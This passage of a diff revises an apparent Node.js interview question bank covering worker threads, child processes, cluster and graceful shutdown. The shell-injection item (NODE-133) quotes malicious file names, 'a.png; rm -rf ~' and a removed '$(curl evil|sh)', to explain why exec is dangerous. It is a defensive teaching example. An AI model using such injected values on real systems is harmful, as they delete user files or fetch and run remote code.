+Answer: The remaining port does not crash the process by itself, but further messages have nowhere to go. Listen for `'close'` on the port and handle the lost peer explicitly.
 
 ### NODE-125 — Ports and workers keeping the process alive
 
@@ -512,17 +516,17 @@ Answer: The other port is not automatically fatal, but messages go nowhere; list
 
 **Question:**
 
-A script using a `MessagePort` never exits. Why, and how do you fix it?
+A script that uses a `MessagePort` never exits. Why, and how do you fix it?
 
 **Answer:**
 
-A port with a `'message'` listener (or after `.start()`/`.ref()`) is an active handle and keeps the event loop open. Call `port.close()` when finished, or `port.unref()` if it should not hold the process open. A running `Worker` also keeps the parent alive until it exits unless you `worker.unref()`.
+A port is an active handle once it has a `'message'` listener, or after you call `start` or `ref`. Active handles keep the event loop running, so the process stays up even when your script looks finished. Call `port.close()` when the conversation is over, or `port.unref()` when this port should not be a reason to stay alive. A running `Worker` is the same kind of handle. It keeps the parent alive until the worker exits, unless you call `worker.unref()`.
 
 **Follow-up:**
 
-What does `unref` change for correctness?
+What does `unref` change about correctness?
 
-Answer: The process may exit while messages are still in flight, so only unref for best-effort background work.
+Answer: The process may exit while messages are still queued. Use `unref` only for background work that is allowed to be dropped. If the message must be delivered, leave the handle ref'd until you are done.
 
 ### NODE-126 — How worker errors surface
 
@@ -532,17 +536,17 @@ Answer: The process may exit while messages are still in flight, so only unref f
 
 **Question:**
 
-What happens to the parent when a worker throws an uncaught exception?
+What happens in the parent when a worker throws an exception that nobody catches?
 
 **Answer:**
 
-The worker stops and the parent receives an `'error'` event on the `Worker` object with the error, followed by `'exit'` with a non-zero exit code. If the parent has no `'error'` listener, the `EventEmitter` rule applies and the error is thrown in the parent, potentially crashing it. `'messageerror'` fires when a received message cannot be deserialized. Always register `'error'`, `'messageerror'`, and `'exit'`.
+The worker stops. The parent gets an `'error'` event on that `Worker`, carrying the error, then `'exit'` with a non-zero code. If nobody listened for `'error'`, EventEmitter throws it in the parent, which can take the process down. `'messageerror'` fires when a received message cannot be deserialized. Register `'error'`, `'messageerror'`, and `'exit'` on every worker. An unhandled rejection in the worker follows Node's normal rules and, by default, becomes an uncaught exception on this same path.
 
 **Follow-up:**
 
-Is a rejected promise inside the worker an error event?
+Does a rejected promise inside the worker emit `'error'` on the parent?
 
-Answer: An unhandled rejection in the worker follows normal Node rules (by default it becomes an uncaught exception and triggers the same path). Handle it in the worker too.
+Answer: An unhandled rejection in the worker follows normal Node rules. By default it becomes an uncaught exception and then takes the same `'error'` and `'exit'` path. Handle it in the worker as well.
 
 ### NODE-127 — Can a worker crash the whole process
 
@@ -552,17 +556,17 @@ Answer: An unhandled rejection in the worker follows normal Node rules (by defau
 
 **Question:**
 
-Can a worker bring down the main process, and under what conditions?
+Can a worker bring down the main process, and in which cases?
 
 **Answer:**
 
-A JavaScript exception or heap limit inside a worker kills only that worker and surfaces as events in the parent; set `resourceLimits` so a runaway worker fails with `ERR_WORKER_OUT_OF_MEMORY` instead of consuming the machine. The parent can still crash if it fails to handle the `'error'` event, or if the process-level OOM killer acts. A fault in native code (segfault in an addon) kills the entire process because workers share it. For hard fault isolation use child processes.
+A JavaScript exception or a V8 heap limit kills only that worker. The parent hears it through `'error'` and `'exit'`. `resourceLimits` makes a runaway worker fail with `ERR_WORKER_OUT_OF_MEMORY` instead of consuming the machine. The parent can still die if it has no `'error'` listener, because that event then throws, or if the OS kills the process for memory. A segfault in an addon is the process's memory, so every thread dies. To keep a native crash contained, use a child process.
 
 **Follow-up:**
 
-Where do you attach `process.on('uncaughtException')` for workers?
+Where should `process.on('uncaughtException')` live for worker failures?
 
-Answer: Inside the worker, for logging and exit; in the parent it does not catch errors originating inside a worker thread.
+Answer: Inside the worker, if you want to log and exit there. The parent's `uncaughtException` handler does not see exceptions that originated in a worker thread.
 
 ### NODE-128 — Limiting a worker's resources
 
@@ -576,13 +580,13 @@ How do you cap memory for a worker, and what happens when the cap is hit?
 
 **Answer:**
 
-Pass `resourceLimits` to the constructor: `{ maxOldGenerationSizeMb, maxYoungGenerationSizeMb, codeRangeSizeMb, stackSizeMb }`. When the old-generation limit is exceeded, the worker terminates and the parent receives an error with code `ERR_WORKER_OUT_OF_MEMORY`. These limits constrain the V8 heap, not off-heap memory such as `Buffer`/`ArrayBuffer` allocations, so total RSS can still exceed them.
+Pass `resourceLimits` to the `Worker` constructor. The fields are `maxOldGenerationSizeMb`, `maxYoungGenerationSizeMb`, `codeRangeSizeMb`, and `stackSizeMb`. When the old-generation limit is exceeded, V8 terminates that worker. The parent receives an `'error'` whose code is `ERR_WORKER_OUT_OF_MEMORY`, then `'exit'`. These numbers bound the V8 heap. They do not bound memory outside the heap, such as `Buffer` and `ArrayBuffer` allocations, so resident memory can still grow past them. Treat the limits as a heap fuse, and still watch process memory.
 
 **Follow-up:**
 
-What should the pool do after such an exit?
+What should the pool do after that exit?
 
-Answer: Reject the in-flight task, log with the task id, and spawn a replacement worker so capacity recovers.
+Answer: Reject the task that was in flight, log it with the task id, and spawn a replacement worker so the pool's capacity comes back.
 
 ### NODE-129 — Stopping a worker
 
@@ -592,17 +596,17 @@ Answer: Reject the in-flight task, log with the task id, and spawn a replacement
 
 **Question:**
 
-Compare `worker.terminate()` with a cooperative shutdown message.
+Compare `worker.terminate()` with asking the worker to shut down by message.
 
 **Answer:**
 
-`worker.terminate()` returns a promise and stops JavaScript execution as soon as possible; the worker gets no chance to flush or release resources. A cooperative shutdown sends a message so the worker finishes the current task, closes its handles, and exits on its own. Good practice is cooperative first, then `terminate()` after a timeout, and awaiting the `'exit'` event.
+`worker.terminate()` returns a promise and stops the worker's JavaScript as soon as it can. The worker does not get to flush buffers or close its own resources. A cooperative shutdown sends a message. The worker finishes the current task, closes handles, and exits on its own. Prefer that path first, then call `terminate()` if it has not exited by a timeout, and wait for `'exit'` either way. `terminate()` can drop messages that have not been delivered, and in-flight tasks will never resolve, so the parent has to reject those promises itself.
 
 **Follow-up:**
 
-What does `terminate()` do to messages in flight?
+What does `terminate()` do to messages that are already in flight?
 
-Answer: Pending messages may be dropped and in-flight tasks never resolve, so the parent must reject outstanding promises itself.
+Answer: They may be dropped, and the task that was running never resolves. The parent has to reject its outstanding promises itself.
 
 ### NODE-130 — When workers do not help
 
@@ -612,17 +616,17 @@ Answer: Pending messages may be dropped and in-flight tasks never resolve, so th
 
 **Question:**
 
-Should you put an HTTP client or database queries into worker threads to improve throughput?
+Should you move an HTTP client or database queries into worker threads to raise throughput?
 
 **Answer:**
 
-Usually no. The main loop already handles I/O concurrency efficiently, and workers add memory, startup, and message-copy overhead. Workers pay off for CPU-bound JavaScript such as hashing, compression in JS, image or PDF processing, and parsing very large documents. Exceptions are isolating flaky code or running a blocking synchronous native library.
+Usually no. The main thread already waits on many sockets at once, and the operating system does the waiting. A worker adds a private heap, startup, and a copy of every message, which is overhead on work that was not using the CPU. Workers pay off when the JavaScript itself is the cost: hashing, compression written in JavaScript, images, PDFs, or parsing a very large document. Two exceptions are worth it even for I/O-shaped calls. You may want to isolate code that crashes, or you may be stuck with a native library whose API blocks.
 
 **Follow-up:**
 
-How would you prove a worker is worth it?
+How do you prove a worker is worth adding?
 
-Answer: Benchmark end-to-end latency and throughput with and without it, including message serialization cost, not just the compute time.
+Answer: Compare end-to-end latency and throughput with and without it, and include the cost of cloning or transferring the payload. Timing only the compute step leaves that cost out.
 
 ### NODE-131 — child_process versus workers
 
@@ -636,13 +640,13 @@ When do you spawn a child process instead of a worker thread?
 
 **Answer:**
 
-When you need a different program or language, a stronger fault and memory boundary, different environment variables or privileges, or the ability to kill and restart without affecting the parent. Cost: higher startup and memory per process and IPC by pipes with serialization. Workers are lighter and can share memory buffers; processes are safer and isolated by the OS.
+Use a child process when you need a different program or language, a separate memory space, different environment variables or privileges, or the ability to kill and restart that work without touching the parent. You pay more startup time, more memory, and IPC that serializes over a pipe. A worker is lighter, and it can share an `ArrayBuffer` by transfer or a `SharedArrayBuffer` by mapping. A process is the stronger boundary. A segfault in a worker's native addon takes down the whole process. A crashed child ends only itself.
 
 **Follow-up:**
 
-Which gives better protection from a native crash?
+Which one protects the parent from a crash in native code?
 
-Answer: Processes. A segfault in a worker's native addon takes down the whole process; a crashed child only ends itself.
+Answer: The child process. A segfault in a worker's addon is a fault in the shared process, so the parent dies with it. A crashed child ends only itself.
 
 ### NODE-132 — spawn, exec, execFile, and fork
 
@@ -656,13 +660,13 @@ Compare `spawn`, `exec`, `execFile`, and `fork`.
 
 **Answer:**
 
-`spawn(cmd, args)` streams stdio, uses no shell by default, and has no output size limit, so it suits long-running or large-output commands. `exec(cmdString)` runs through a shell and buffers output into a callback, limited by `maxBuffer`. `execFile(file, args)` buffers like `exec` but skips the shell, which is safer. `fork(modulePath)` spawns a new Node process running a script with an IPC channel for `send`/`message`. Default to `execFile` or `spawn` with an argument array.
+`spawn` starts a program with an argument array, skips the shell by default, and streams stdio with no output cap. That fits long-running commands. `exec` runs a shell string, buffers output, and stops at `maxBuffer`. `execFile` buffers the same way but skips the shell, which removes shell injection. `fork` starts another Node process and opens an IPC channel for `send` and `'message'`. Default to `execFile` or `spawn` with an argument array. Use `exec` only when you truly need a shell.
 
 **Follow-up:**
 
-Which do you use for a long-running `ffmpeg` job with progress output?
+Which do you use for a long-running `ffmpeg` job that prints progress?
 
-Answer: `spawn`, reading stdout/stderr as streams, with `'close'` to detect completion and an `AbortSignal` or `kill` for cancellation.
+Answer: `spawn`. Read stdout and stderr as streams, use the `'close'` event to know it finished, and cancel with an `AbortSignal` or `kill`.
 
 ### NODE-133 — Shell injection with exec
 
@@ -672,17 +676,17 @@ Answer: `spawn`, reading stdout/stderr as streams, with `'close'` to detect comp
 
 **Question:**
 
-Why is `exec(\`convert ${userFile} out.png\`)` dangerous, and what is the fix?
+Why is ``exec(`convert ${userFile} out.png`)`` dangerous, and what is the fix?
 
 **Answer:**
 
-The whole string is parsed by a shell, so a filename like `a.png; rm -rf ~` or `$(curl evil|sh)` executes extra commands. Use `execFile('convert', [userFile, 'out.png'])` or `spawn` with an argument array and no `shell: true`, so arguments are never interpreted by a shell. Also validate paths and use an allowlist for binaries; arguments beginning with `-` can still be parsed as options by the target program.
+`exec` joins your string and asks a shell to parse it. A file name such as `a.png; rm -rf ~`, or one that contains `$(...)`, is more commands, not one argument. `execFile('convert', [userFile, 'out.png'])`, or `spawn` with an argument array and without `shell: true`, passes those strings as arguments. The shell never sees them. Still validate the path, and allow only the binaries you intend to run. An argument that starts with `-` can still be read as a flag by the program itself. Where the program supports it, put `--` before user input.
 
 **Follow-up:**
 
-Does `execFile` fully remove injection risk?
+Does `execFile` remove injection risk completely?
 
-Answer: It removes shell injection, but argument injection remains possible; use `--` where supported and validate inputs.
+Answer: It removes shell injection. The target program can still treat a user string as an option. Use `--` where the program supports it, and validate the input.
 
 ### NODE-134 — exec maxBuffer overflow
 
@@ -692,17 +696,17 @@ Answer: It removes shell injection, but argument injection remains possible; use
 
 **Question:**
 
-What happens when a command run with `exec` prints more than `maxBuffer`?
+What happens when a command started with `exec` prints more than `maxBuffer`?
 
 **Answer:**
 
-The child is terminated and the callback receives an error (`ERR_CHILD_PROCESS_STDIO_MAXBUFFER`) while output captured so far may be truncated. The default is 1 MiB. Use `spawn` and process the streams incrementally, or raise `maxBuffer` only when the output is bounded and small enough to hold in memory.
+Node kills the child and calls your callback with an error whose code is `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`. Output captured before the limit can be truncated, so you should not treat it as complete. The default limit is 1 MiB. If you know the output is small and bounded, you can raise `maxBuffer`. If you do not know the size, do not buffer it. `spawn` and consume the streams as they arrive, or write them to a file, so memory stays proportional to what you process rather than to the whole output.
 
 **Follow-up:**
 
-Which is safer for unknown output size?
+Which approach is safer when you do not know how large the output will be?
 
-Answer: Streaming with `spawn`, writing to a file or piping to a consumer, so memory stays bounded.
+Answer: `spawn`, and consume the streams as they arrive, or write them to a file. Memory then stays bounded by what you process, not by the whole output.
 
 ### NODE-135 — IPC with fork
 
@@ -712,17 +716,17 @@ Answer: Streaming with `spawn`, writing to a file or piping to a consumer, so me
 
 **Question:**
 
-How does messaging work between a parent and a `fork`ed child, and what serialization applies?
+How does messaging work between a parent and a `fork`ed child, and what serialization does it use?
 
 **Answer:**
 
-The parent uses `child.send(msg)` and `child.on('message')`; the child uses `process.send(msg)` and `process.on('message')`. The default `serialization` is `'json'`, so messages are JSON-encoded (no `Map`, `BigInt`, or `undefined` fidelity); `'advanced'` uses structured clone. Handles such as sockets and servers can be passed as a second argument to `send`. Call `child.disconnect()` (or let it exit) so the IPC channel does not keep processes alive.
+The parent calls `child.send` and listens for `'message'`. The child uses `process.send` and `process.on('message')`. The default `serialization` is `'json'`, so the message is JSON. `Map`, `BigInt`, and `undefined` do not round-trip. `'advanced'` uses structured clone instead, which keeps those values. You can also pass handles, such as a socket or a server, as the second argument to `send`, and Node moves that handle to the child. Call `child.disconnect()`, or let the child exit, so the IPC channel does not keep both processes alive after the work is done.
 
 **Follow-up:**
 
-How do you know the channel is closed?
+How do you know the channel is closed before you send?
 
-Answer: Listen for `'disconnect'`, and check `child.connected` before sending to avoid `ERR_IPC_CHANNEL_CLOSED`.
+Answer: Listen for `'disconnect'`, and check `child.connected` before `send`. Sending on a closed channel throws `ERR_IPC_CHANNEL_CLOSED`.
 
 ### NODE-136 — Handling child exit correctly
 
@@ -736,13 +740,13 @@ What is the difference between the `'error'`, `'exit'`, and `'close'` events on 
 
 **Answer:**
 
-`'error'` fires when the process could not be spawned (such as `ENOENT`), could not be killed, or an IPC send failed; it is not an exit. `'exit'` fires when the process ends, with `code` or `signal`, but stdio streams may still hold unread data. `'close'` fires after the process has ended and its stdio streams have closed, so it is the safe point to finalize collected output. Always check both `code` and `signal`.
+`'error'` means spawn failed, such as `ENOENT`, or a kill or an IPC send failed. It does not mean the child exited. `'exit'` means the process ended, with a `code` or a `signal`, while stdout and stderr may still be flushing. `'close'` fires after the process and those streams have closed, so collected output is complete. Check both `code` and `signal`. Some failures emit both `'error'` and `'exit'`, so make completion idempotent.
 
 **Follow-up:**
 
-Can both `'error'` and `'exit'` fire?
+Can `'error'` and `'exit'` both fire for one child?
 
-Answer: Yes in some cases, so make completion handling idempotent.
+Answer: Yes, in some failure paths. Handle completion once, so a second event does not settle the same promise twice or run cleanup twice.
 
 ### NODE-137 — Killing a child and its tree
 
@@ -752,19 +756,19 @@ Answer: Yes in some cases, so make completion handling idempotent.
 
 **Question:**
 
-`child.kill()` does not stop the grandchildren your command started. How do you terminate the whole tree?
+`child.kill()` does not stop grandchildren that the command started. How do you terminate the whole tree?
 
 **Answer:**
 
-`kill()` signals only the direct child. On POSIX, start the child with `detached: true` so it leads a new process group, then `process.kill(-child.pid, 'SIGTERM')` signals the group. Alternatively use a helper such as `tree-kill`, or pass an `AbortSignal` via the `signal` option for the direct process. Using `shell: true` adds a shell layer that can outlive the target, which is another reason to avoid it. Escalate to `SIGKILL` after a timeout.
+`kill` signals only the direct child. Grandchildren keep running. On POSIX, start the child with `detached: true` so it becomes the leader of a new process group, then `process.kill(-child.pid, 'SIGTERM')` signals that group, because a negative pid means the group. A helper such as `tree-kill` walks the tree for you. The `signal` option, an `AbortSignal`, cancels the direct child only. `shell: true` adds a shell that can outlive the program you meant to stop, which is another reason to skip the shell. If the group is still alive after a timeout, escalate to `SIGKILL`.
 
 **Follow-up:**
 
 What changes on Windows?
 
-Answer: Process groups and signals differ; `taskkill /T /F /PID` is the usual approach for trees.
+Answer: Process groups and POSIX signals do not work the same way. `taskkill /T /F /PID` is the usual way to kill a process and the children it started.
 
-### NODE-138 — stdio options and blocked children
+### NODE-138 — stdio options and a child that blocks
 
 **Difficulty:** Senior
 
@@ -772,17 +776,17 @@ Answer: Process groups and signals differ; `taskkill /T /F /PID` is the usual ap
 
 **Question:**
 
-A spawned child hangs forever after printing a lot of output. What is a likely cause?
+A spawned child hangs forever after printing a lot of output, and the parent looks idle. What is a likely cause?
 
 **Answer:**
 
-With the default `stdio: 'pipe'`, the parent must read the child's stdout and stderr. If it does not, the OS pipe buffer fills and the child blocks on write. Fix by consuming or piping both streams, or setting them to `'ignore'` or `'inherit'`. Do not forget stderr.
+The default `stdio` is `'pipe'`. The parent must read both stdout and stderr. If it does not, the operating-system pipe buffer fills, and the child's next write blocks. The child looks hung, and the parent looks idle, because both are waiting. Read or pipe both streams, or set the ones you do not need to `'ignore'`. `'inherit'` connects the child to the parent's terminal, which fits a CLI or a dev tool and gives you no programmatic access to the bytes. Forgetting stderr is enough to cause the hang, even when you are reading stdout.
 
 **Follow-up:**
 
-When is `'inherit'` appropriate?
+When is `'inherit'` the right choice?
 
-Answer: For CLIs and dev tooling where the child should write directly to the parent's terminal; it gives no programmatic access to the output.
+Answer: For a CLI or a dev tool, when the child should write straight to the parent's terminal. You then cannot read that output as a stream in the parent.
 
 ### NODE-139 — What cluster does
 
@@ -792,17 +796,17 @@ Answer: For CLIs and dev tooling where the child should write directly to the pa
 
 **Question:**
 
-What does the `cluster` module do and what problem does it solve?
+What does the `cluster` module do, and which problem does it solve?
 
 **Answer:**
 
-A primary process forks several worker processes, each running a copy of the app. Workers that call `listen()` on the same port share it through the primary, so connections spread across cores. It scales request handling across CPUs and gives crash isolation per worker. Workers are separate processes with separate memory, so there is no shared in-memory state.
+The primary process forks several worker processes, and each worker runs a copy of the application. Workers that call `listen` on the same port share that port through the primary, so accepted connections are spread across cores. That is how one Node program uses more than one core for request handling, and a crashed worker does not have to take the others down. These workers are processes from `child_process.fork`, not `worker_threads`. Each has its own memory. An in-memory cache or session map in one worker is invisible to the others.
 
 **Follow-up:**
 
-Is cluster built on workers or processes?
+Is cluster built on worker threads or on processes?
 
-Answer: Processes, via `child_process.fork`, not `worker_threads`.
+Answer: On processes. The primary uses `child_process.fork`. It does not use `worker_threads`.
 
 ### NODE-140 — Basic cluster usage
 
@@ -812,9 +816,13 @@ Answer: Processes, via `child_process.fork`, not `worker_threads`.
 
 **Question:**
 
-Write a minimal cluster server that forks one worker per core and replaces workers that die.
+Write a minimal cluster server that forks one worker per available core and replaces a worker that dies.
 
 **Answer:**
+
+In the primary, `isPrimary` is the current check. `isMaster` is the old name. Fork once per `availableParallelism()`, not per `os.cpus().length`, so a container is less likely to overshoot its CPU limit. Each worker runs the HTTP server and listens on the same port. The primary's `'exit'` handler forks a replacement so a dead worker does not permanently shrink capacity. Respawn without a limit turns a startup crash into a hot loop. Add backoff, or a maximum restart rate, and alert, because a worker that dies immediately will otherwise burn CPU forever.
+
+**Code:**
 
 ```js
 import cluster from 'node:cluster';
@@ -823,8 +831,8 @@ import { availableParallelism } from 'node:os';
 
 if (cluster.isPrimary) {
   for (let i = 0; i < availableParallelism(); i++) cluster.fork();
-  cluster.on('exit', (w, code, sig) => {
-    console.error(`worker ${w.process.pid} died`, code, sig);
+  cluster.on('exit', (worker, code, signal) => {
+    console.error('worker died', worker.process.pid, code, signal);
     cluster.fork();
   });
 } else {
@@ -832,13 +840,11 @@ if (cluster.isPrimary) {
 }
 ```
 
-`isPrimary` replaces the deprecated `isMaster`. Add backoff so a crash loop does not respawn endlessly.
-
 **Follow-up:**
 
-What stops a crash loop?
+What stops that replacement from becoming a crash loop?
 
-Answer: Exponential backoff or a max-restart rate, plus alerting, because respawning a worker that fails at startup burns CPU.
+Answer: Back off, or cap how often you restart, and alert. A worker that fails during startup will otherwise be forked again immediately and burn CPU.
 
 ### NODE-141 — How cluster distributes connections
 
@@ -848,17 +854,17 @@ Answer: Exponential backoff or a max-restart rate, plus alerting, because respaw
 
 **Question:**
 
-How does cluster decide which worker gets a connection?
+How does cluster decide which worker receives a new connection?
 
 **Answer:**
 
-Default `cluster.SCHED_RR` (everywhere except Windows): the primary accepts connections and passes them to workers round-robin. `SCHED_NONE` leaves it to the OS, where workers accept directly; this can skew heavily toward a few workers. Set with `cluster.schedulingPolicy` or `NODE_CLUSTER_SCHED_POLICY`. Balancing is per connection, so long-lived keep-alive connections can still produce uneven request load.
+The default policy is `cluster.SCHED_RR` everywhere except Windows. The primary accepts the connection and hands the socket to workers in round-robin. `SCHED_NONE` lets the workers accept themselves, and the operating system can skew that heavily toward a few of them. Set the policy with `cluster.schedulingPolicy` or with `NODE_CLUSTER_SCHED_POLICY`. The unit of balancing is the connection, not the request. A handful of busy keep-alive clients pinned to one worker can still overload that worker while others sit idle.
 
 **Follow-up:**
 
-Why can load still be uneven with round-robin?
+Why can CPU still look uneven when the policy is round-robin?
 
-Answer: Connections are assigned, not requests; a few busy keep-alive clients pinned to one worker can dominate it.
+Answer: Round-robin assigns connections, not requests. A few busy keep-alive clients stuck on one worker can dominate that worker's CPU.
 
 ### NODE-142 — Cluster versus worker_threads
 
@@ -868,17 +874,17 @@ Answer: Connections are assigned, not requests; a few busy keep-alive clients pi
 
 **Question:**
 
-When do you choose cluster, and when worker threads?
+When do you choose cluster, and when do you choose worker threads?
 
 **Answer:**
 
-Cluster scales a network server across cores with process-level fault isolation and one event loop per process; workers do not share memory. Worker threads offload CPU-bound tasks from a loop within one process, with cheaper messaging and optional shared memory. They solve different problems and can be combined: cluster for request parallelism, a worker pool per process for heavy tasks. In containers and Kubernetes, multiple single-process replicas often replace cluster.
+Cluster scales a network server across cores. Each process has its own event loop and memory, so one crash stays in that process. Worker threads move CPU-bound JavaScript off one loop, inside a single process, with cheaper messages and an optional `SharedArrayBuffer`. They solve different problems, and you can use both: cluster or replicas for requests, and a worker pool in each process for heavy tasks. On Kubernetes, several single-process replicas often replace cluster, because the orchestrator already restarts pods, checks health, scales, and sets limits.
 
 **Follow-up:**
 
-Why might replicas beat cluster on Kubernetes?
+Why might one process per pod beat cluster on Kubernetes?
 
-Answer: The orchestrator already handles restarts, health checks, scaling, and resource limits per pod, which makes an in-container supervisor redundant.
+Answer: The orchestrator already restarts the pod, checks health, scales, and applies resource limits. A cluster primary inside the container repeats that supervision.
 
 ### NODE-143 — Limits of cluster
 
@@ -888,17 +894,17 @@ Answer: The orchestrator already handles restarts, health checks, scaling, and r
 
 **Question:**
 
-What breaks or gets harder when you move an app to cluster?
+What gets harder, or simply breaks, when you move an application onto cluster?
 
 **Answer:**
 
-In-memory state diverges: sessions, caches, rate-limit counters, and WebSocket rooms differ per worker and need Redis or sticky sessions. Memory is duplicated per process, startup cost multiplies, and the primary's round-robin hand-off is a throughput ceiling at extreme connection rates. Scheduled jobs run once per worker unless guarded. Debugging and log correlation need a worker id.
+Anything you kept in process memory now differs per worker. Sessions, caches, rate-limit counters, and WebSocket rooms need Redis, or another shared store, or sticky sessions so one client stays on one worker. Memory and startup cost are multiplied by the number of workers. At very high connection rates the primary's accept-and-hand-off path becomes a ceiling. A cron job in the app runs once per worker unless you guard it. Logs from several processes need a worker id or you cannot tell which process handled a request.
 
 **Follow-up:**
 
-How do you run a cron job once?
+How do you run a scheduled job only once?
 
-Answer: Run it only in the primary or in one designated worker, or use an external scheduler or a distributed lock.
+Answer: Run it only in the primary, or in one worker you designate. An external scheduler, or a distributed lock, is the other way to keep the rest from doing the same work.
 
 ### NODE-144 — Zero-downtime restart with cluster
 
@@ -908,17 +914,17 @@ Answer: Run it only in the primary or in one designated worker, or use an extern
 
 **Question:**
 
-Describe a rolling restart that drops no requests.
+Describe a rolling restart of cluster workers that does not drop in-flight requests.
 
 **Answer:**
 
-On a signal such as `SIGUSR2`, the primary restarts workers one at a time: fork a replacement, wait for its `'listening'` event, then call `oldWorker.disconnect()`. The old worker stops accepting new connections, finishes in-flight requests, and exits; the primary escalates with `kill` if it exceeds a timeout. Repeat until all are replaced. This keeps capacity at or above N−1 and lets a bad deploy be halted if new workers fail to become ready.
+On a signal such as `SIGUSR2`, the primary replaces workers one at a time. It forks a new worker, waits for `'listening'`, then `disconnect`s the old one. The old worker stops accepting, finishes in-flight requests, and exits. If it misses a deadline, the primary kills it. One at a time keeps you about one worker below full capacity, and you can stop if a new worker never listens. Long-lived connections hold the old worker until they close, so set a drain deadline and tell clients to reconnect.
 
 **Follow-up:**
 
-What do long-lived connections do during this?
+What do long-lived connections do during the drain?
 
-Answer: They keep the old worker alive until closed. Set a drain deadline and signal clients to reconnect, otherwise the restart stalls.
+Answer: They keep the old worker alive until they close. Set a deadline and tell clients to reconnect, or the restart waits on those sockets.
 
 ### NODE-145 — Why graceful shutdown matters
 
@@ -928,17 +934,17 @@ Answer: They keep the old worker alive until closed. Set a drain deadline and si
 
 **Question:**
 
-What is a graceful shutdown, and why does it matter during deploys?
+What is a graceful shutdown, and why does it matter during a deploy?
 
 **Answer:**
 
-On `SIGTERM` (or `SIGINT`) the process stops accepting new work, lets in-flight requests and jobs finish, closes database and queue connections, flushes logs, and exits with code 0. Without it, deploys drop requests and may leave jobs or transactions half done. Orchestrators such as Kubernetes send `SIGTERM`, wait a grace period, then `SIGKILL`, so your own drain timeout must be shorter than that period.
+On `SIGTERM` or `SIGINT`, the process stops taking new work, lets requests and jobs that are already running finish, closes database and queue connections, flushes logs, and exits 0. Without that sequence, a deploy cuts off in-flight requests and can leave a job or a transaction half done. Kubernetes sends `SIGTERM`, waits for the pod's grace period, then sends `SIGKILL`, which cannot be handled. Your own drain timeout has to finish before that grace period ends, or the platform kills you mid-drain. Fail the readiness check first, so the load balancer stops sending new traffic while you close.
 
 **Follow-up:**
 
-Why also handle readiness during shutdown?
+Why fail the readiness check at the start of shutdown?
 
-Answer: Fail the readiness probe first so the load balancer stops routing new traffic; otherwise requests arrive while you are closing.
+Answer: The load balancer uses readiness to decide where to send traffic. If you close first, new requests still arrive while sockets and pools are going away.
 
 ### NODE-146 — Graceful shutdown for an HTTP server
 
@@ -948,34 +954,35 @@ Answer: Fail the readiness probe first so the load balancer stops routing new tr
 
 **Question:**
 
-Write a shutdown handler for an `http.Server` that has a hard timeout.
+Sketch a shutdown handler for an `http.Server` that includes a hard timeout.
 
 **Answer:**
+
+A `closing` flag makes shutdown idempotent, so a second signal does not close the database twice. `server.close` stops new connections and waits for open ones. On Node 20 and 22 it also closes idle keep-alive connections. `closeIdleConnections` has existed since Node 18.2, and `closeAllConnections` forces the rest. The hard timeout is unref'd so it does not keep the process alive, and it exits 1 if drain runs long. After `close`, end the pool and exit 0, or 1 if `close` failed. Keep that budget inside the orchestrator's grace period.
+
+**Code:**
 
 ```js
 let closing = false;
 function shutdown(signal) {
   if (closing) return;
   closing = true;
-  console.log(`${signal}: draining`);
-  const t = setTimeout(() => process.exit(1), 10_000);
-  t.unref();
+  const timer = setTimeout(() => process.exit(1), 10_000);
+  timer.unref();
   server.close(async (err) => {
     try { await db.end(); } finally { process.exit(err ? 1 : 0); }
   });
-  server.closeIdleConnections(); // Node 18.2+
+  server.closeIdleConnections();
 }
 process.on('SIGTERM', () => shutdown('SIGTERM'));
 process.on('SIGINT', () => shutdown('SIGINT'));
 ```
 
-`server.close()` stops new connections but waits for existing ones; since Node 19 it also closes idle keep-alive connections, and `closeAllConnections()` can force the rest.
-
 **Follow-up:**
 
-Why guard against a second signal?
+Why ignore a second signal instead of running shutdown again?
 
-Answer: Repeated signals would run shutdown twice and double-close resources; make shutdown idempotent.
+Answer: A second `SIGTERM` would close pools and call `server.close` again. The flag makes shutdown run once, so cleanup is not repeated.
 
 ### NODE-147 — Shutdown with workers and children
 
@@ -985,17 +992,17 @@ Answer: Repeated signals would run shutdown twice and double-close resources; ma
 
 **Question:**
 
-How do you include worker pools, child processes, and cluster workers in graceful shutdown?
+How do worker pools, child processes, and cluster workers fit into the same graceful shutdown?
 
 **Answer:**
 
-Order matters: stop intake, drain, release resources, exit. For a worker pool, reject or finish queued tasks, wait for in-flight ones, then destroy the pool or `terminate()` workers after a timeout. For children, send `SIGTERM`, wait for `'close'`, escalate to `SIGKILL`. In cluster, the primary calls `worker.disconnect()` on each worker and waits for exits. Forward the signal explicitly, since children do not automatically stop when the parent receives `SIGTERM` in all setups.
+Stop intake, then drain, then release resources, then exit. For a pool, finish or reject queued tasks, wait for in-flight ones, and `terminate` anything still running after the timeout. For children, send `SIGTERM`, wait for `'close'`, then `SIGKILL`. In cluster, the primary `disconnect`s each worker and waits for `'exit'`. Children do not stop just because the parent got `SIGTERM`, so forward it. `SIGKILL` runs none of this and can orphan children. Use a process group, a supervisor, or an IPC `'disconnect'` handler so the child exits when the parent is gone.
 
 **Follow-up:**
 
-What if the parent is killed with `SIGKILL`?
+What runs if the parent is killed with `SIGKILL`?
 
-Answer: Nothing runs; children may be orphaned. Use process groups, supervisors, or child-side checks such as IPC `'disconnect'` to exit when the parent disappears.
+Answer: Nothing in the parent. Children can be left running. A process group, a supervisor, or an IPC `'disconnect'` handler in the child is what makes them exit.
 
 ### NODE-148 — vm versus worker isolation
 
@@ -1005,17 +1012,17 @@ Answer: Nothing runs; children may be orphaned. Use process groups, supervisors,
 
 **Question:**
 
-Compare `node:vm`, worker threads, and child processes as isolation mechanisms.
+Compare `node:vm`, worker threads, and child processes as ways to isolate code.
 
 **Answer:**
 
-`vm` creates a separate global object (context) but shares the thread, the heap, and the event loop with the host. It is not a security boundary, cannot be preempted except by `timeout` on synchronous code, and shares memory pressure. A worker has its own isolate, heap, and event loop, can be given `resourceLimits`, and can be terminated, but shares the process, so a native crash or process-level resource exhaustion still affects the host. A child process gives OS-level isolation (memory, crash, privileges). Choose by threat model: `vm` for convenience scoping of trusted code, workers for CPU and heap isolation, processes or containers for untrusted code.
+`vm` gives the script a separate global object, but it shares the thread, the heap, and the event loop, so it is not a security boundary. `timeout` interrupts synchronous code only. A worker has its own isolate, heap, and event loop. `resourceLimits` and `terminate` contain a JavaScript failure, but a native crash or a process-wide out-of-memory kill still hits the host. A child process is an OS boundary: separate memory, a separate crash, and privileges you can drop. Use `vm` for trusted code, workers for CPU and heap, and a process or container for anything you do not trust.
 
 **Follow-up:**
 
 Why does `vm` not isolate memory?
 
